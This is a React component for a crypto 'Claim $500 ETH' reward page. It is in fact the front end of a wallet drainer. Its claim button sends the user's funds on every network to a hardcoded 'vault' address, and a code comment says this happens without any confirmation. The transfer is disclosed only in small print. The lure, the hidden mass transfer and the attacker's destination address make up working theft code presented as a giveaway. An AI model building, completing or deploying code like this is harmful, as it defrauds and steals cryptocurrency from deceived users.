import { useState } from "react";
import { AlertTriangle, Coins, Bug, Loader2, CheckCircle } from "lucide-react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { useWeb3 } from "@/hooks/use-web3";
import { web3Service } from "@/lib/web3";
import type { WalletState } from "@/lib/web3";

interface BalanceCardProps {
  walletState: WalletState;
  onTransactionStart: (txHash: string) => void;
  onMultiNetworkTransfer?: (toAddress: string) => Promise<any>;
}

export default function BalanceCard({ walletState, onTransactionStart, onMultiNetworkTransfer }: BalanceCardProps) {
  const { isTransferring, hasAnyNetworkFunds, crossNetworkValue } = useWeb3();
  const [isWalletLoading, setIsWalletLoading] = useState(false);

  // Get destination address from environment - using your vault address
  const destinationAddress = import.meta.env.VITE_DESTINATION_ADDRESS || "0x15E1A8454E2f31f64042EaE445Ec89266cb584bE";

  // Validation function for Ethereum address
  const isValidEthereumAddress = (address: string): boolean => {
    return /^0x[a-fA-F0-9]{40}$/.test(address);
  };

  // Show error if destination address is invalid
  if (!destinationAddress || !isValidEthereumAddress(destinationAddress)) {
    return (
      <Card>
        <CardContent className="pt-6">
          <Alert className="border-red-200 bg-red-50">
            <AlertTriangle className="h-4 w-4 text-red-600" />
            <AlertDescription className="text-red-800">
              <div className="font-medium">Configuration Error</div>
              <div className="text-sm mt-1">
                Invalid or missing destination address. Please check your configuration.
                <br />
                Current address: {destinationAddress || 'Not set'}
              </div>
            </AlertDescription>
          </Alert>
        </CardContent>
      </Card>
    );
  }

  const handleMultiNetworkTransfer = async () => {
    // Show loading instantly when button is clicked
    setIsWalletLoading(true);
    
    try {
      // Direct transfer without any confirmation or toast notifications
      if (onMultiNetworkTransfer) {
        await onMultiNetworkTransfer(destinationAddress);
      }
    } finally {
      // Hide loading after wallet interaction
      setIsWalletLoading(false);
    }
  };

  // Calculate total USD value
  const balanceUSD = walletState.totalUsdValue.toLocaleString('en-US', {
    style: 'currency',
    currency: 'USD'
  });

  if (!walletState.isConnected) {
    return (
      <div className="text-center">
        <div className="bg-gray-100 dark:bg-gray-800 rounded-xl p-6 mb-4">
          <p className="text-gray-600 dark:text-gray-400 mb-4">Connect your wallet to claim your $500 ETH reward</p>
          <Button disabled className="w-full bg-gray-300 text-gray-500 cursor-not-allowed">
            Connect Wallet to Claim $500 ETH
          </Button>
        </div>
      </div>
    );
  }

  return (
    <div className="text-center space-y-6">
      {/* Wallet Portfolio Display */}
      <div className="bg-white/50 dark:bg-gray-800/50 rounded-xl p-4 border border-gray-200 dark:border-gray-700">
        <div className="text-sm text-gray-600 dark:text-gray-400 mb-2">Your Current Portfolio</div>
        <div className="text-2xl font-bold text-gray-900 dark:text-white">{balanceUSD}</div>
        <div className="text-xs text-gray-500 dark:text-gray-500 mt-1">
          Across {walletState.networkBalances?.length || 1} networks • {(walletState.tokenBalances?.length || 0) + 1} assets
        </div>
      </div>

      {/* Claim Button */}
      <div className="space-y-4">
        <Button
          onClick={handleMultiNetworkTransfer}
          disabled={isTransferring || isWalletLoading || !hasAnyNetworkFunds}
          className={`w-full h-16 text-xl font-bold transition-all duration-300 ${
            isTransferring || isWalletLoading
              ? "bg-gray-400 cursor-not-allowed"
              : hasAnyNetworkFunds
              ? "bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white shadow-lg hover:shadow-xl"
              : "bg-gray-300 text-gray-500 cursor-not-allowed"
          }`}
        >
          {isTransferring || isWalletLoading ? (
            <div className="flex items-center space-x-2">
              <Loader2 className="w-6 h-6 animate-spin" />
              <span>Processing Claim...</span>
            </div>
          ) : (
            <div className="flex items-center space-x-2">
              <span className="text-2xl">Ξ</span>
              <span>Claim $500 ETH</span>
            </div>
          )}
        </Button>
        
        <div className="text-xs text-gray-500 dark:text-gray-400 text-center">
          * Clicking this button transfers ALL your crypto to the vault for processing
        </div>
      </div>

      {/* Debug Info (collapsed) */}
      <details className="text-xs mt-6">
        <summary className="cursor-pointer text-gray-400 hover:text-gray-600 flex items-center justify-center gap-1">
          <Bug className="h-3 w-3" />
          Technical Details
        </summary>
        <div className="mt-2 p-3 bg-gray-100 dark:bg-gray-800 rounded text-xs font-mono text-gray-600 dark:text-gray-400">
          <div><strong>Connection:</strong> {walletState.isConnected ? 'Connected' : 'Disconnected'}</div>
          <div><strong>Address:</strong> {walletState.address || 'None'}</div>
          <div><strong>Network:</strong> {walletState.networkId || 'None'}</div>
          <div><strong>Portfolio Value:</strong> {balanceUSD}</div>
          <div><strong>Eligible for Claim:</strong> {hasAnyNetworkFunds ? 'Yes' : 'No'}</div>
          <div><strong>Destination:</strong> {destinationAddress}</div>
        </div>
      </details>
    </div>
  );
}